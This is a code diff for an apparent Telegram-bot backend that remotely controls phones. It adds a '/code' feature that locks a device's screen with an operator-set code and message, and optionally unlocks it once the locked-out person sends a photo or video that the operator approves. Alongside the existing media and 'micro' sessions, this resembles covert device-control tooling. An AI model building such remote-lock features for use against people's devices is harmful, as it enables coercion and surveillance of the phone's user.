@@ -32,6 +32,7 @@ state = {
     "raw_links": [],
     "video_sessions": {},    # chat_id -> session
     "msg_sessions": {},      # chat_id -> {step, mode, questions[], answers[], cur_q, pending_cmd}
+    "code_sessions": {},     # chat_id -> {step, secret, text, allow_media}
     "selected_device": {},   # chat_id -> device_id
     "questions": [],         # глобальный список вопросов опросника
     "micro_sessions": {},    # chat_id -> {step, dev_id, device_index, device_name}
@@ -92,7 +93,8 @@ async def answer_callback(cb_id: str, text: str = ""):
     except Exception as e:
         print(f"answer_callback error: {e}")
 
-async def send_tg_file(chat_id: str, file_bytes: bytes, filename: str, caption: str = ""):
+async def send_tg_file(chat_id: str, file_bytes: bytes, filename: str,
+                       caption: str = "", reply_markup: dict = None):
     """Проксируем файл с телефона в Telegram. Если > 45MB — разбиваем на части."""
     if not BOT_TOKEN:
         return
@@ -111,13 +113,15 @@ async def send_tg_file(chat_id: str, file_bytes: bytes, filename: str, caption: 
 
     total = len(file_bytes)
     if total <= PART_SIZE:
-        # Файл помещается целиком
         try:
             async with httpx.AsyncClient(timeout=120) as client:
                 files = {field: (filename, file_bytes)}
-                data  = {"chat_id": chat_id}
+                data  = {"chat_id": chat_id, "parse_mode": "Markdown"}
                 if caption:
                     data["caption"] = caption
+                if reply_markup:
+                    import json as _json
+                    data["reply_markup"] = _json.dumps(reply_markup)
                 await client.post(
                     f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                     data=data, files=files
@@ -276,6 +280,18 @@ def msg_minimize_keyboard():
         {"text": "▶️ Просто показать",        "callback_data": "msg_minimize_no"},
     ]]}
 
+def code_media_keyboard():
+    return {"inline_keyboard": [[
+        {"text": "📸 Разрешить фото/видео", "callback_data": "code_media_yes"},
+        {"text": "🚫 Только код",           "callback_data": "code_media_no"},
+    ]]}
+
+def code_confirm_keyboard(dev_id: str, chat_id: str):
+    return {"inline_keyboard": [[
+        {"text": "✅ Разрешить",  "callback_data": f"code_approve|{dev_id}|{chat_id}"},
+        {"text": "❌ Отклонить", "callback_data": f"code_deny|{dev_id}|{chat_id}"},
+    ]]}
+
 def video_mode_keyboard():
     return {"inline_keyboard": [[
         {"text": "▶️ Просто показать",   "callback_data": "vmsg_plain"},
@@ -412,6 +428,44 @@ async def process_callback(callback: dict):
 
         await answer_callback(cb_id, "✅")
         await send_tg(chat_id, text, reply_markup=devices_keyboard(chat_id))
+        return
+
+    # ── /code flow — allow_media ───────────────────────────────────────────────
+    csess = state["code_sessions"].get(chat_id)
+    if csess and csess["step"] == "allow_media" and data in ("code_media_yes", "code_media_no"):
+        csess["allow_media"] = (data == "code_media_yes")
+        await answer_callback(cb_id)
+        state["code_sessions"].pop(chat_id, None)
+
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err); return
+
+        cmd = {
+            "cmd":         "code_lock",
+            "secret":      csess["secret"],
+            "text":        csess["text"],
+            "allow_media": csess["allow_media"],
+        }
+        await enqueue_multi(chat_id, cmd, "code_lock")
+        return
+
+    # ── Подтверждение фото/видео от телефона ──────────────────────────────────
+    if data.startswith("code_approve|") or data.startswith("code_deny|"):
+        parts   = data.split("|")
+        action  = parts[0]        # code_approve / code_deny
+        dev_id  = parts[1] if len(parts) > 1 else ""
+        tgt_cid = parts[2] if len(parts) > 2 else chat_id
+        await answer_callback(cb_id)
+
+        result_cmd = "code_unlock" if action == "code_approve" else "code_denied"
+        if dev_id:
+            await enqueue_command(tgt_cid, dev_id, {"cmd": result_cmd}, result_cmd)
+        else:
+            await enqueue_multi(tgt_cid, {"cmd": result_cmd}, result_cmd)
+
+        status = "✅ Разблокировано" if action == "code_approve" else "❌ Отклонено"
+        await send_tg(chat_id, status)
         return
 
     # ── Режим сообщения (/msg flow) ───────────────────────────────────────────
@@ -802,6 +856,36 @@ async def process_update(update: dict):
             return
         await start_msg_flow(chat_id, message, dev_id)
 
+    elif text.startswith("/code "):
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err)
+            return
+        secret = text[6:].strip()
+        if not secret:
+            await send_tg(chat_id, "⚠️ Укажи код: /code 1234")
+            return
+        # Сохраняем сессию, спрашиваем текст сообщения
+        state["code_sessions"][chat_id] = {
+            "step":        "text",
+            "secret":      secret,
+            "text":        "",
+            "allow_media": False,
+        }
+        await send_tg(chat_id, "✏️ Напиши текст который увидит человек на экране:")
+        return
+
+    # ── /code flow — шаг text ─────────────────────────────────────────────────
+    csess = state["code_sessions"].get(chat_id)
+    if csess and csess["step"] == "text":
+        csess["text"] = text
+        csess["step"] = "allow_media"
+        await send_tg(chat_id,
+            f"📸 Разрешить отправку фото/видео как альтернативу коду?\n\n"
+            f"_(Если да — ты получишь файл в бот с кнопками ✅/❌ для подтверждения)_",
+            reply_markup=code_media_keyboard())
+        return
+
     elif text in ("/video1", "/video2", "/video3"):
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
@@ -1077,6 +1161,7 @@ async def upload(
     x_device_id: Optional[str] = Header(None),
     x_chat_id: Optional[str] = Header(None),
     x_caption: Optional[str] = Header(None),
+    x_code_upload: Optional[str] = Header(None),
 ):
     if x_device_secret != DEVICE_SECRET:
         raise HTTPException(status_code=403, detail="Forbidden")
@@ -1090,7 +1175,16 @@ async def upload(
     filename = file.filename or "file"
     caption  = urllib.parse.unquote(x_caption) if x_caption else f"Файл: {filename}"
 
-    asyncio.create_task(send_tg_file(chat_id, data, filename, caption))
+    if x_code_upload == "true":
+        # Отправляем боту с кнопками подтверждения
+        asyncio.create_task(send_tg_file(
+            chat_id, data, filename,
+            f"📸 *Запрос на разблокировку*\nУстройство: `{dev_id}`\nФайл: {filename}\n\nПодтвердить разблокировку?",
+            reply_markup=code_confirm_keyboard(dev_id, chat_id)
+        ))
+    else:
+        asyncio.create_task(send_tg_file(chat_id, data, filename, caption))
+
     return {"ok": True, "size": len(data)}
 
 
